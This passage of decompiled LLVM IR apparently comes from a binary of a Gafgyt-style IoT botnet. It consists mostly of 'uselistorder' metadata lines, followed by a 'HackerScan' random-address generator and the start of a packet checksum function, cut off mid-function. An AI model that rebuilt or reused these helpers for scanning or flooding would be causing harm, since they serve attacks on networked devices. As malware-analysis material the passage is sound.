  uselistorder label %dec_label_pc_80505d0, { 1, 0 }
  uselistorder label %dec_label_pc_8050597, { 1, 0 }
  uselistorder label %dec_label_pc_805055e, { 1, 0 }
  uselistorder label %dec_label_pc_8050525, { 1, 0 }
  uselistorder label %dec_label_pc_80504ec, { 1, 0 }
  uselistorder label %dec_label_pc_80504b3, { 1, 0 }
  uselistorder label %dec_label_pc_805047a, { 1, 0 }
  uselistorder label %dec_label_pc_8050441, { 1, 0 }
  uselistorder label %dec_label_pc_8050408, { 1, 0 }
  uselistorder label %dec_label_pc_80503cf, { 1, 0 }
  uselistorder label %dec_label_pc_8050396, { 1, 0 }
  uselistorder label %dec_label_pc_805035d, { 1, 0 }
  uselistorder label %dec_label_pc_8050324, { 1, 0 }
  uselistorder label %dec_label_pc_80502eb, { 1, 0 }
  uselistorder label %dec_label_pc_80502b2, { 1, 0 }
  uselistorder label %dec_label_pc_8050279, { 1, 0 }
  uselistorder label %dec_label_pc_8050240, { 1, 0 }
  uselistorder label %dec_label_pc_8050207, { 1, 0 }
  uselistorder label %dec_label_pc_80501ce, { 1, 0 }
  uselistorder label %dec_label_pc_8050195, { 1, 0 }
  uselistorder label %dec_label_pc_805015c, { 1, 0 }
  uselistorder label %dec_label_pc_8050123, { 1, 0 }
  uselistorder label %dec_label_pc_80500ea, { 1, 0 }
  uselistorder label %dec_label_pc_80500b1, { 1, 0 }
  uselistorder label %dec_label_pc_8050078, { 1, 0 }
  uselistorder label %dec_label_pc_805003f, { 1, 0 }
  uselistorder label %dec_label_pc_8050006, { 1, 0 }
  uselistorder label %dec_label_pc_804ffcd, { 1, 0 }
  uselistorder label %dec_label_pc_804ff94, { 1, 0 }
  uselistorder label %dec_label_pc_804ff5b, { 1, 0 }
  uselistorder label %dec_label_pc_804ff22, { 1, 0 }
  uselistorder label %dec_label_pc_804fee9, { 1, 0 }
  uselistorder label %dec_label_pc_804feb0, { 1, 0 }
  uselistorder label %dec_label_pc_804fe77, { 1, 0 }
  uselistorder label %dec_label_pc_804fe3e, { 1, 0 }
  uselistorder label %dec_label_pc_804fe05, { 1, 0 }
  uselistorder label %dec_label_pc_804fdcc, { 1, 0 }
  uselistorder label %dec_label_pc_804fd93, { 1, 0 }
  uselistorder label %dec_label_pc_804fd5a, { 1, 0 }
  uselistorder label %dec_label_pc_804fd21, { 1, 0 }
  uselistorder label %dec_label_pc_804fce8, { 1, 0 }
  uselistorder label %dec_label_pc_804fcaf, { 1, 0 }
  uselistorder label %dec_label_pc_804fc76, { 1, 0 }
  uselistorder label %dec_label_pc_804fc3d, { 1, 0 }
  uselistorder label %dec_label_pc_804fc04, { 1, 0 }
  uselistorder label %dec_label_pc_804fbcb, { 1, 0 }
  uselistorder label %dec_label_pc_804fb92, { 1, 0 }
  uselistorder label %dec_label_pc_804fb59, { 1, 0 }
  uselistorder label %dec_label_pc_804fb20, { 1, 0 }
  uselistorder label %dec_label_pc_804fae7, { 1, 0 }
  uselistorder label %dec_label_pc_804faae, { 1, 0 }
  uselistorder label %dec_label_pc_804fa75, { 1, 0 }
  uselistorder label %dec_label_pc_804fa3c, { 1, 0 }
  uselistorder label %dec_label_pc_804fa03, { 1, 0 }
  uselistorder label %dec_label_pc_804f9ca, { 1, 0 }
  uselistorder label %dec_label_pc_804f991, { 1, 0 }
  uselistorder label %dec_label_pc_804f958, { 1, 0 }
  uselistorder label %dec_label_pc_804f91f, { 1, 0 }
  uselistorder label %dec_label_pc_804f8e6, { 1, 0 }
  uselistorder label %dec_label_pc_804f8ad, { 1, 0 }
  uselistorder label %dec_label_pc_804f874, { 1, 0 }
  uselistorder label %dec_label_pc_804f83b, { 1, 0 }
  uselistorder label %dec_label_pc_804f802, { 1, 0 }
  uselistorder label %dec_label_pc_804f7c9, { 1, 0 }
  uselistorder label %dec_label_pc_804f790, { 1, 0 }
  uselistorder label %dec_label_pc_804f757, { 1, 0 }
  uselistorder label %dec_label_pc_804f71e, { 1, 0 }
  uselistorder label %dec_label_pc_804f6e5, { 1, 0 }
  uselistorder label %dec_label_pc_804f6ac, { 1, 0 }
  uselistorder label %dec_label_pc_804f673, { 1, 0 }
  uselistorder label %dec_label_pc_804f63a, { 1, 0 }
  uselistorder label %dec_label_pc_804f601, { 1, 0 }
  uselistorder label %dec_label_pc_804f5c8, { 1, 0 }
  uselistorder label %dec_label_pc_804f58f, { 1, 0 }
  uselistorder label %dec_label_pc_804f556, { 1, 0 }
  uselistorder label %dec_label_pc_804f51d, { 1, 0 }
  uselistorder label %dec_label_pc_804f4e4, { 1, 0 }
  uselistorder label %dec_label_pc_804f4ab, { 1, 0 }
  uselistorder label %dec_label_pc_804f472, { 1, 0 }
  uselistorder label %dec_label_pc_804f439, { 1, 0 }
  uselistorder label %dec_label_pc_804f400, { 1, 0 }
  uselistorder label %dec_label_pc_804f3c7, { 1, 0 }
  uselistorder label %dec_label_pc_804f38e, { 1, 0 }
  uselistorder label %dec_label_pc_804f355, { 1, 0 }
  uselistorder label %dec_label_pc_804f31c, { 1, 0 }
  uselistorder label %dec_label_pc_804f2e3, { 1, 0 }
  uselistorder label %dec_label_pc_804f2aa, { 1, 0 }
  uselistorder label %dec_label_pc_804f271, { 1, 0 }
  uselistorder label %dec_label_pc_804f238, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ff, { 1, 0 }
  uselistorder label %dec_label_pc_804f1c6, { 1, 0 }
  uselistorder label %dec_label_pc_804f18d, { 1, 0 }
  uselistorder label %dec_label_pc_804f154, { 1, 0 }
  uselistorder label %dec_label_pc_804f11b, { 1, 0 }
  uselistorder label %dec_label_pc_804f0e2, { 1, 0 }
  uselistorder label %dec_label_pc_804f0a9, { 1, 0 }
  uselistorder label %dec_label_pc_804f070, { 1, 0 }
  uselistorder label %dec_label_pc_804f037, { 1, 0 }
  uselistorder label %dec_label_pc_804effe, { 1, 0 }
  uselistorder label %dec_label_pc_804efc5, { 1, 0 }
  uselistorder label %dec_label_pc_804ef8c, { 1, 0 }
  uselistorder label %dec_label_pc_804ef53, { 1, 0 }
  uselistorder label %dec_label_pc_804ef1a, { 1, 0 }
  uselistorder label %dec_label_pc_804eee1, { 1, 0 }
  uselistorder label %dec_label_pc_804eea8, { 1, 0 }
  uselistorder label %dec_label_pc_804ee6f, { 1, 0 }
  uselistorder label %dec_label_pc_804ee36, { 1, 0 }
  uselistorder label %dec_label_pc_804edfd, { 1, 0 }
  uselistorder label %dec_label_pc_804edc4, { 1, 0 }
  uselistorder label %dec_label_pc_804ed8b, { 1, 0 }
  uselistorder label %dec_label_pc_804ed52, { 1, 0 }
  uselistorder label %dec_label_pc_804ed19, { 1, 0 }
  uselistorder label %dec_label_pc_804ece0, { 1, 0 }
  uselistorder label %dec_label_pc_804eca7, { 1, 0 }
  uselistorder label %dec_label_pc_804ec6e, { 1, 0 }
  uselistorder label %dec_label_pc_804ec35, { 1, 0 }
  uselistorder label %dec_label_pc_804ebfc, { 1, 0 }
  uselistorder label %dec_label_pc_804ebc3, { 1, 0 }
  uselistorder label %dec_label_pc_804eb8a, { 1, 0 }
  uselistorder label %dec_label_pc_804eb51, { 1, 0 }
  uselistorder label %dec_label_pc_804eb18, { 1, 0 }
  uselistorder label %dec_label_pc_804eadf, { 1, 0 }
  uselistorder label %dec_label_pc_804eaa6, { 1, 0 }
  uselistorder label %dec_label_pc_804ea6d, { 1, 0 }
  uselistorder label %dec_label_pc_804ea34, { 1, 0 }
  uselistorder label %dec_label_pc_804e9fb, { 1, 0 }
  uselistorder label %dec_label_pc_804e9c2, { 1, 0 }
  uselistorder label %dec_label_pc_804e989, { 1, 0 }
  uselistorder label %dec_label_pc_804e950, { 1, 0 }
  uselistorder label %dec_label_pc_804e917, { 1, 0 }
  uselistorder label %dec_label_pc_804e8de, { 1, 0 }
  uselistorder label %dec_label_pc_804e8a5, { 1, 0 }
  uselistorder label %dec_label_pc_804e86c, { 1, 0 }
  uselistorder label %dec_label_pc_804e833, { 1, 0 }
  uselistorder label %dec_label_pc_804e7fa, { 1, 0 }
  uselistorder label %dec_label_pc_804e7c1, { 1, 0 }
  uselistorder label %dec_label_pc_804e788, { 1, 0 }
  uselistorder label %dec_label_pc_804e74f, { 1, 0 }
  uselistorder label %dec_label_pc_804e716, { 1, 0 }
  uselistorder label %dec_label_pc_804e6dd, { 1, 0 }
  uselistorder label %dec_label_pc_804e6a4, { 1, 0 }
  uselistorder label %dec_label_pc_804e66b, { 1, 0 }
  uselistorder label %dec_label_pc_804e632, { 1, 0 }
  uselistorder label %dec_label_pc_804e5f9, { 1, 0 }
  uselistorder label %dec_label_pc_804e5c0, { 1, 0 }
  uselistorder label %dec_label_pc_804e587, { 1, 0 }
  uselistorder label %dec_label_pc_804e54e, { 1, 0 }
  uselistorder label %dec_label_pc_804e515, { 1, 0 }
  uselistorder label %dec_label_pc_804e4dc, { 1, 0 }
  uselistorder label %dec_label_pc_804e4a3, { 1, 0 }
  uselistorder label %dec_label_pc_804e46a, { 1, 0 }
  uselistorder label %dec_label_pc_804e431, { 1, 0 }
  uselistorder label %dec_label_pc_804e3f8, { 1, 0 }
  uselistorder label %dec_label_pc_804e3bf, { 1, 0 }
  uselistorder label %dec_label_pc_804e386, { 1, 0 }
  uselistorder label %dec_label_pc_804e34d, { 1, 0 }
  uselistorder label %dec_label_pc_804e314, { 1, 0 }
  uselistorder label %dec_label_pc_804e2db, { 1, 0 }
  uselistorder label %dec_label_pc_804e2a2, { 1, 0 }
  uselistorder label %dec_label_pc_804e269, { 1, 0 }
  uselistorder label %dec_label_pc_804e230, { 1, 0 }
  uselistorder label %dec_label_pc_804e1f7, { 1, 0 }
  uselistorder label %dec_label_pc_804e1be, { 1, 0 }
  uselistorder label %dec_label_pc_804e185, { 1, 0 }
  uselistorder label %dec_label_pc_804e14c, { 1, 0 }
  uselistorder label %dec_label_pc_804e113, { 1, 0 }
  uselistorder label %dec_label_pc_804e0da, { 1, 0 }
  uselistorder label %dec_label_pc_804e0a1, { 1, 0 }
  uselistorder label %dec_label_pc_804e068, { 1, 0 }
  uselistorder label %dec_label_pc_804e02f, { 1, 0 }
  uselistorder label %dec_label_pc_804dff6, { 1, 0 }
  uselistorder label %dec_label_pc_804dfbd, { 1, 0 }
  uselistorder label %dec_label_pc_804df84, { 1, 0 }
  uselistorder label %dec_label_pc_804df4b, { 1, 0 }
  uselistorder label %dec_label_pc_804df12, { 1, 0 }
  uselistorder label %dec_label_pc_804ded9, { 1, 0 }
  uselistorder label %dec_label_pc_804dea0, { 1, 0 }
  uselistorder label %dec_label_pc_804de67, { 1, 0 }
  uselistorder label %dec_label_pc_804de2e, { 1, 0 }
  uselistorder label %dec_label_pc_804ddf5, { 1, 0 }
  uselistorder label %dec_label_pc_804ddbc, { 1, 0 }
  uselistorder label %dec_label_pc_804dd83, { 1, 0 }
  uselistorder label %dec_label_pc_804dd4a, { 1, 0 }
  uselistorder label %dec_label_pc_804dd11, { 1, 0 }
  uselistorder label %dec_label_pc_804dcd8, { 1, 0 }
  uselistorder label %dec_label_pc_804dc9f, { 1, 0 }
  uselistorder label %dec_label_pc_804dc66, { 1, 0 }
  uselistorder label %dec_label_pc_804dc2d, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf4, { 1, 0 }
  uselistorder label %dec_label_pc_804dbbb, { 1, 0 }
  uselistorder label %dec_label_pc_804db82, { 1, 0 }
  uselistorder label %dec_label_pc_804db49, { 1, 0 }
  uselistorder label %dec_label_pc_804db10, { 1, 0 }
  uselistorder label %dec_label_pc_804dad7, { 1, 0 }
  uselistorder label %dec_label_pc_804da9e, { 1, 0 }
  uselistorder label %dec_label_pc_804da65, { 1, 0 }
  uselistorder label %dec_label_pc_804da2c, { 1, 0 }
  uselistorder label %dec_label_pc_804d9f3, { 1, 0 }
  uselistorder label %dec_label_pc_804d9ba, { 1, 0 }
  uselistorder label %dec_label_pc_804d981, { 1, 0 }
  uselistorder label %dec_label_pc_804d948, { 1, 0 }
  uselistorder label %dec_label_pc_804d90f, { 1, 0 }
  uselistorder label %dec_label_pc_804d8d6, { 1, 0 }
  uselistorder label %dec_label_pc_804d89d, { 1, 0 }
  uselistorder label %dec_label_pc_804d864, { 1, 0 }
  uselistorder label %dec_label_pc_804d82b, { 1, 0 }
  uselistorder label %dec_label_pc_804d7f2, { 1, 0 }
  uselistorder label %dec_label_pc_804d7b9, { 1, 0 }
  uselistorder label %dec_label_pc_804d780, { 1, 0 }
  uselistorder label %dec_label_pc_804d747, { 1, 0 }
  uselistorder label %dec_label_pc_804d70e, { 1, 0 }
  uselistorder label %dec_label_pc_804d6d5, { 1, 0 }
  uselistorder label %dec_label_pc_804d69c, { 1, 0 }
  uselistorder label %dec_label_pc_804d663, { 1, 0 }
  uselistorder label %dec_label_pc_804d62a, { 1, 0 }
  uselistorder label %dec_label_pc_804d5f1, { 1, 0 }
  uselistorder label %dec_label_pc_804d5b8, { 1, 0 }
  uselistorder label %dec_label_pc_804d57f, { 1, 0 }
  uselistorder label %dec_label_pc_804d546, { 1, 0 }
  uselistorder label %dec_label_pc_804d50d, { 1, 0 }
  uselistorder label %dec_label_pc_804d4d4, { 1, 0 }
  uselistorder label %dec_label_pc_804d49b, { 1, 0 }
  uselistorder label %dec_label_pc_804d462, { 1, 0 }
  uselistorder label %dec_label_pc_804d429, { 1, 0 }
  uselistorder label %dec_label_pc_804d3f0, { 1, 0 }
  uselistorder label %dec_label_pc_804d3b7, { 1, 0 }
  uselistorder label %dec_label_pc_804d37e, { 1, 0 }
  uselistorder label %dec_label_pc_804d345, { 1, 0 }
  uselistorder label %dec_label_pc_804d30c, { 1, 0 }
  uselistorder label %dec_label_pc_804d2d3, { 1, 0 }
  uselistorder label %dec_label_pc_804d29a, { 1, 0 }
  uselistorder label %dec_label_pc_804d261, { 1, 0 }
  uselistorder label %dec_label_pc_804d228, { 1, 0 }
  uselistorder label %dec_label_pc_804d1ef, { 1, 0 }
  uselistorder label %dec_label_pc_804d1b6, { 1, 0 }
  uselistorder label %dec_label_pc_804d17d, { 1, 0 }
  uselistorder label %dec_label_pc_804d144, { 1, 0 }
  uselistorder label %dec_label_pc_804d10b, { 1, 0 }
  uselistorder label %dec_label_pc_804d0d2, { 1, 0 }
  uselistorder label %dec_label_pc_804d099, { 1, 0 }
  uselistorder label %dec_label_pc_804d060, { 1, 0 }
  uselistorder label %dec_label_pc_804d027, { 1, 0 }
  uselistorder label %dec_label_pc_804cfee, { 1, 0 }
  uselistorder label %dec_label_pc_804cfb5, { 1, 0 }
  uselistorder label %dec_label_pc_804cf7c, { 1, 0 }
  uselistorder label %dec_label_pc_804cf43, { 1, 0 }
  uselistorder label %dec_label_pc_804cf0a, { 1, 0 }
  uselistorder label %dec_label_pc_804ced1, { 1, 0 }
  uselistorder label %dec_label_pc_804ce98, { 1, 0 }
  uselistorder label %dec_label_pc_804ce5f, { 1, 0 }
  uselistorder label %dec_label_pc_804ce26, { 1, 0 }
  uselistorder label %dec_label_pc_804cded, { 1, 0 }
  uselistorder label %dec_label_pc_804cdb4, { 1, 0 }
  uselistorder label %dec_label_pc_804cd7b, { 1, 0 }
  uselistorder label %dec_label_pc_804cd42, { 1, 0 }
  uselistorder label %dec_label_pc_804cd09, { 1, 0 }
  uselistorder label %dec_label_pc_804ccd0, { 1, 0 }
  uselistorder label %dec_label_pc_804cc97, { 1, 0 }
  uselistorder label %dec_label_pc_804cc5e, { 1, 0 }
  uselistorder label %dec_label_pc_804cc25, { 1, 0 }
  uselistorder label %dec_label_pc_804cbec, { 1, 0 }
  uselistorder label %dec_label_pc_804cbb3, { 1, 0 }
  uselistorder label %dec_label_pc_804cb7a, { 1, 0 }
  uselistorder label %dec_label_pc_804cb41, { 1, 0 }
  uselistorder label %dec_label_pc_804cb08, { 1, 0 }
  uselistorder label %dec_label_pc_804cacf, { 1, 0 }
  uselistorder label %dec_label_pc_804ca96, { 1, 0 }
  uselistorder label %dec_label_pc_804ca5d, { 1, 0 }
  uselistorder label %dec_label_pc_804ca24, { 1, 0 }
  uselistorder label %dec_label_pc_804c9eb, { 1, 0 }
  uselistorder label %dec_label_pc_804c9b2, { 1, 0 }
  uselistorder label %dec_label_pc_804c979, { 1, 0 }
  uselistorder label %dec_label_pc_804c940, { 1, 0 }
  uselistorder label %dec_label_pc_804c907, { 1, 0 }
  uselistorder label %dec_label_pc_804c8ce, { 1, 0 }
  uselistorder label %dec_label_pc_804c895, { 1, 0 }
  uselistorder label %dec_label_pc_804c85c, { 1, 0 }
  uselistorder label %dec_label_pc_804c823, { 1, 0 }
  uselistorder label %dec_label_pc_804c7ea, { 1, 0 }
  uselistorder label %dec_label_pc_804c7b1, { 1, 0 }
  uselistorder label %dec_label_pc_804c778, { 1, 0 }
  uselistorder label %dec_label_pc_804c73f, { 1, 0 }
  uselistorder label %dec_label_pc_804c706, { 1, 0 }
  uselistorder label %dec_label_pc_804c6cd, { 1, 0 }
  uselistorder label %dec_label_pc_804c694, { 1, 0 }
  uselistorder label %dec_label_pc_804c65b, { 1, 0 }
  uselistorder label %dec_label_pc_804c622, { 1, 0 }
  uselistorder label %dec_label_pc_804c5e9, { 1, 0 }
  uselistorder label %dec_label_pc_804c5b0, { 1, 0 }
  uselistorder label %dec_label_pc_804c577, { 1, 0 }
  uselistorder label %dec_label_pc_804c53e, { 1, 0 }
  uselistorder label %dec_label_pc_804c505, { 1, 0 }
  uselistorder label %dec_label_pc_804c4cc, { 1, 0 }
  uselistorder label %dec_label_pc_804c493, { 1, 0 }
  uselistorder label %dec_label_pc_804c45a, { 1, 0 }
  uselistorder label %dec_label_pc_804c421, { 1, 0 }
  uselistorder label %dec_label_pc_804c3e8, { 1, 0 }
  uselistorder label %dec_label_pc_804c3af, { 1, 0 }
  uselistorder label %dec_label_pc_804c376, { 1, 0 }
  uselistorder label %dec_label_pc_804c33d, { 1, 0 }
  uselistorder label %dec_label_pc_804c304, { 1, 0 }
  uselistorder label %dec_label_pc_804c2cb, { 1, 0 }
  uselistorder label %dec_label_pc_804c292, { 1, 0 }
  uselistorder label %dec_label_pc_804c259, { 1, 0 }
  uselistorder label %dec_label_pc_804c220, { 1, 0 }
  uselistorder label %dec_label_pc_804c1e7, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ae, { 1, 0 }
  uselistorder label %dec_label_pc_804c175, { 1, 0 }
  uselistorder label %dec_label_pc_804c13c, { 1, 0 }
  uselistorder label %dec_label_pc_804c103, { 1, 0 }
  uselistorder label %dec_label_pc_804c0ca, { 1, 0 }
  uselistorder label %dec_label_pc_804c091, { 1, 0 }
  uselistorder label %dec_label_pc_804c058, { 1, 0 }
  uselistorder label %dec_label_pc_804c01f, { 1, 0 }
  uselistorder label %dec_label_pc_804bfe6, { 1, 0 }
  uselistorder label %dec_label_pc_804bfad, { 1, 0 }
  uselistorder label %dec_label_pc_804bf74, { 1, 0 }
  uselistorder label %dec_label_pc_804bf3b, { 1, 0 }
  uselistorder label %dec_label_pc_804bf02, { 1, 0 }
  uselistorder label %dec_label_pc_804bec9, { 1, 0 }
  uselistorder label %dec_label_pc_804be90, { 1, 0 }
  uselistorder label %dec_label_pc_804be57, { 1, 0 }
  uselistorder label %dec_label_pc_804be1e, { 1, 0 }
  uselistorder label %dec_label_pc_804bde5, { 1, 0 }
  uselistorder label %dec_label_pc_804bdac, { 1, 0 }
  uselistorder label %dec_label_pc_804bd73, { 1, 0 }
  uselistorder label %dec_label_pc_804bd3a, { 1, 0 }
  uselistorder label %dec_label_pc_804bd01, { 1, 0 }
  uselistorder label %dec_label_pc_804bcc8, { 1, 0 }
  uselistorder label %dec_label_pc_804bc8f, { 1, 0 }
  uselistorder label %dec_label_pc_804bc56, { 1, 0 }
  uselistorder label %dec_label_pc_804bc1d, { 1, 0 }
  uselistorder label %dec_label_pc_804bbe4, { 1, 0 }
  uselistorder label %dec_label_pc_804bbab, { 1, 0 }
  uselistorder label %dec_label_pc_804bb72, { 1, 0 }
  uselistorder label %dec_label_pc_804bb39, { 1, 0 }
  uselistorder label %dec_label_pc_804bb00, { 1, 0 }
  uselistorder label %dec_label_pc_804bac7, { 1, 0 }
  uselistorder label %dec_label_pc_804ba8e, { 1, 0 }
  uselistorder label %dec_label_pc_804ba55, { 1, 0 }
  uselistorder label %dec_label_pc_804ba1c, { 1, 0 }
  uselistorder label %dec_label_pc_804b9e3, { 1, 0 }
  uselistorder label %dec_label_pc_804b9aa, { 1, 0 }
  uselistorder label %dec_label_pc_804b971, { 1, 0 }
  uselistorder label %dec_label_pc_804b938, { 1, 0 }
  uselistorder label %dec_label_pc_804b8ff, { 1, 0 }
  uselistorder label %dec_label_pc_804b8c6, { 1, 0 }
  uselistorder label %dec_label_pc_804b88d, { 1, 0 }
  uselistorder label %dec_label_pc_804b854, { 1, 0 }
  uselistorder label %dec_label_pc_804b81b, { 1, 0 }
  uselistorder label %dec_label_pc_804b7e2, { 1, 0 }
  uselistorder label %dec_label_pc_804b7ac, { 1, 0 }
  uselistorder label %dec_label_pc_804b776, { 1, 0 }
  uselistorder label %dec_label_pc_804b740, { 1, 0 }
  uselistorder label %dec_label_pc_804b70a, { 1, 0 }
  uselistorder label %dec_label_pc_804b6d4, { 1, 0 }
  uselistorder label %dec_label_pc_804b69e, { 1, 0 }
  uselistorder label %dec_label_pc_804b668, { 1, 0 }
  uselistorder label %dec_label_pc_804b632, { 1, 0 }
  uselistorder label %dec_label_pc_804b5fc, { 1, 0 }
  uselistorder label %dec_label_pc_804b5c6, { 1, 0 }
  uselistorder label %dec_label_pc_804b590, { 1, 0 }
  uselistorder label %dec_label_pc_804b55a, { 1, 0 }
  uselistorder label %dec_label_pc_804b524, { 1, 0 }
  uselistorder label %dec_label_pc_804b4ee, { 1, 0 }
  uselistorder label %dec_label_pc_804b4b8, { 1, 0 }
  uselistorder label %dec_label_pc_804b482, { 1, 0 }
  uselistorder label %dec_label_pc_804b44c, { 1, 0 }
  uselistorder label %dec_label_pc_804b416, { 1, 0 }
  uselistorder label %dec_label_pc_804b3e0, { 1, 0 }
  uselistorder label %dec_label_pc_804b3aa, { 1, 0 }
  uselistorder label %dec_label_pc_804b374, { 1, 0 }
  uselistorder label %dec_label_pc_804b33e, { 1, 0 }
  uselistorder label %dec_label_pc_804b308, { 1, 0 }
  uselistorder label %dec_label_pc_804b2d2, { 1, 0 }
  uselistorder label %dec_label_pc_804b29c, { 1, 0 }
  uselistorder label %dec_label_pc_804b266, { 1, 0 }
  uselistorder label %dec_label_pc_804b230, { 1, 0 }
  uselistorder label %dec_label_pc_804b1fa, { 1, 0 }
  uselistorder label %dec_label_pc_804b1c4, { 1, 0 }
  uselistorder label %dec_label_pc_804b18e, { 1, 0 }
  uselistorder label %dec_label_pc_804b158, { 1, 0 }
  uselistorder label %dec_label_pc_804b122, { 1, 0 }
  uselistorder label %dec_label_pc_804b0ec, { 1, 0 }
  uselistorder label %dec_label_pc_804b0b6, { 1, 0 }
  uselistorder label %dec_label_pc_804b080, { 1, 0 }
  uselistorder label %dec_label_pc_804b04a, { 1, 0 }
  uselistorder label %dec_label_pc_804b014, { 1, 0 }
  uselistorder label %dec_label_pc_804afde, { 1, 0 }
  uselistorder label %dec_label_pc_804afa8, { 1, 0 }
  uselistorder label %dec_label_pc_804af72, { 1, 0 }
  uselistorder label %dec_label_pc_804af3c, { 1, 0 }
  uselistorder label %dec_label_pc_804af06, { 1, 0 }
  uselistorder label %dec_label_pc_804aed0, { 1, 0 }
  uselistorder label %dec_label_pc_804ae9a, { 1, 0 }
  uselistorder label %dec_label_pc_804ae64, { 1, 0 }
  uselistorder label %dec_label_pc_804ae2e, { 1, 0 }
  uselistorder label %dec_label_pc_804adf8, { 1, 0 }
  uselistorder label %dec_label_pc_804adc2, { 1, 0 }
  uselistorder label %dec_label_pc_804ad8c, { 1, 0 }
  uselistorder label %dec_label_pc_804ad56, { 1, 0 }
  uselistorder label %dec_label_pc_804ad20, { 1, 0 }
  uselistorder label %dec_label_pc_804acea, { 1, 0 }
  uselistorder label %dec_label_pc_804acb4, { 1, 0 }
  uselistorder label %dec_label_pc_804ac7e, { 1, 0 }
  uselistorder label %dec_label_pc_804ac48, { 1, 0 }
  uselistorder label %dec_label_pc_804ac12, { 1, 0 }
  uselistorder label %dec_label_pc_804abdc, { 1, 0 }
  uselistorder label %dec_label_pc_804aba6, { 1, 0 }
  uselistorder label %dec_label_pc_804ab70, { 1, 0 }
  uselistorder label %dec_label_pc_804ab3a, { 1, 0 }
  uselistorder label %dec_label_pc_804ab04, { 1, 0 }
  uselistorder label %dec_label_pc_804aace, { 1, 0 }
  uselistorder label %dec_label_pc_804aa98, { 1, 0 }
  uselistorder label %dec_label_pc_804aa62, { 1, 0 }
  uselistorder label %dec_label_pc_804aa2c, { 1, 0 }
  uselistorder label %dec_label_pc_804a9f6, { 1, 0 }
  uselistorder label %dec_label_pc_804a9c0, { 1, 0 }
  uselistorder label %dec_label_pc_804a98a, { 1, 0 }
  uselistorder label %dec_label_pc_804a954, { 1, 0 }
  uselistorder label %dec_label_pc_804a91e, { 1, 0 }
  uselistorder label %dec_label_pc_804a8e8, { 1, 0 }
  uselistorder label %dec_label_pc_804a8b2, { 1, 0 }
  uselistorder label %dec_label_pc_804a87c, { 1, 0 }
  uselistorder label %dec_label_pc_804a846, { 1, 0 }
  uselistorder label %dec_label_pc_804a810, { 1, 0 }
  uselistorder label %dec_label_pc_804a7da, { 1, 0 }
  uselistorder label %dec_label_pc_804a7a4, { 1, 0 }
  uselistorder label %dec_label_pc_804a76e, { 1, 0 }
  uselistorder label %dec_label_pc_804a738, { 1, 0 }
  uselistorder label %dec_label_pc_804a702, { 1, 0 }
  uselistorder label %dec_label_pc_804a6cc, { 1, 0 }
  uselistorder label %dec_label_pc_804a696, { 1, 0 }
  uselistorder label %dec_label_pc_804a660, { 1, 0 }
  uselistorder label %dec_label_pc_804a62a, { 1, 0 }
  uselistorder label %dec_label_pc_804a5f4, { 1, 0 }
  uselistorder label %dec_label_pc_804a5be, { 1, 0 }
  uselistorder label %dec_label_pc_804a588, { 1, 0 }
  uselistorder label %dec_label_pc_804a552, { 1, 0 }
  uselistorder label %dec_label_pc_804a51c, { 1, 0 }
  uselistorder label %dec_label_pc_804a4e6, { 1, 0 }
  uselistorder label %dec_label_pc_804a4b0, { 1, 0 }
  uselistorder label %dec_label_pc_804a47a, { 1, 0 }
  uselistorder label %dec_label_pc_804a444, { 1, 0 }
  uselistorder label %dec_label_pc_804a40e, { 1, 0 }
  uselistorder label %dec_label_pc_804a3d8, { 1, 0 }
  uselistorder label %dec_label_pc_804a3a2, { 1, 0 }
  uselistorder label %dec_label_pc_804a36c, { 1, 0 }
  uselistorder label %dec_label_pc_804a336, { 1, 0 }
  uselistorder label %dec_label_pc_804a300, { 1, 0 }
  uselistorder label %dec_label_pc_804a2ca, { 1, 0 }
  uselistorder label %dec_label_pc_804a294, { 1, 0 }
  uselistorder label %dec_label_pc_804a25e, { 1, 0 }
  uselistorder label %dec_label_pc_804a228, { 1, 0 }
  uselistorder label %dec_label_pc_804a1f2, { 1, 0 }
  uselistorder label %dec_label_pc_804a1bc, { 1, 0 }
  uselistorder label %dec_label_pc_804a186, { 1, 0 }
  uselistorder label %dec_label_pc_804a150, { 1, 0 }
  uselistorder label %dec_label_pc_804a11a, { 1, 0 }
  uselistorder label %dec_label_pc_804a0e4, { 1, 0 }
  uselistorder label %dec_label_pc_804a0ae, { 1, 0 }
  uselistorder label %dec_label_pc_804a078, { 1, 0 }
  uselistorder label %dec_label_pc_804a042, { 1, 0 }
  uselistorder label %dec_label_pc_804a00c, { 1, 0 }
  uselistorder label %dec_label_pc_8049fd6, { 1, 0 }
  uselistorder label %dec_label_pc_8049fa0, { 1, 0 }
  uselistorder label %dec_label_pc_8049f6a, { 1, 0 }
  uselistorder label %dec_label_pc_8049f34, { 1, 0 }
  uselistorder label %dec_label_pc_8049efe, { 1, 0 }
  uselistorder label %dec_label_pc_8049ec8, { 1, 0 }
  uselistorder label %dec_label_pc_8049e92, { 1, 0 }
  uselistorder label %dec_label_pc_8049e5c, { 1, 0 }
  uselistorder label %dec_label_pc_8049e26, { 1, 0 }
  uselistorder label %dec_label_pc_8049df0, { 1, 0 }
  uselistorder label %dec_label_pc_8049dba, { 1, 0 }
  uselistorder label %dec_label_pc_8049d84, { 1, 0 }
  uselistorder label %dec_label_pc_8049d4e, { 1, 0 }
  uselistorder label %dec_label_pc_8049d18, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805b522 = load i32, i32* @global_var_8078864.1307, align 4
  %v1_805b52a = call i32 @__GI_ntohl(i32 %v0_805b522)
  %v5_805b52f = and i32 %v1_805b52a, %arg1
  %v1_805b535 = call i32 @rand_cmwc(i32 %v5_805b52f)
  %v1_805b53f = sub i32 -1, %arg1
  %v2_805b541 = and i32 %v1_805b535, %v1_805b53f
  %v5_805b543 = xor i32 %v2_805b541, %v5_805b52f
  ret i32 %v5_805b543
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805b54d = load i32, i32* @ebx, align 4
  %v4_805b57d34 = add i32 %arg2, -1
  %v9_805b57d35 = sub i32 0, %arg2
  %v10_805b57d36 = and i32 %arg2, %v9_805b57d35
  %v11_805b57d37 = icmp slt i32 %v10_805b57d36, 0
  %v12_805b57d38 = icmp eq i32 %v4_805b57d34, 0
  %v13_805b57d39 = icmp slt i32 %v4_805b57d34, 0
  %v3_805b58140 = icmp eq i1 %v13_805b57d39, %v11_805b57d37
  %v4_805b58141 = icmp eq i1 %v12_805b57d38, false
  %v5_805b58142 = and i1 %v4_805b58141, %v3_805b58140
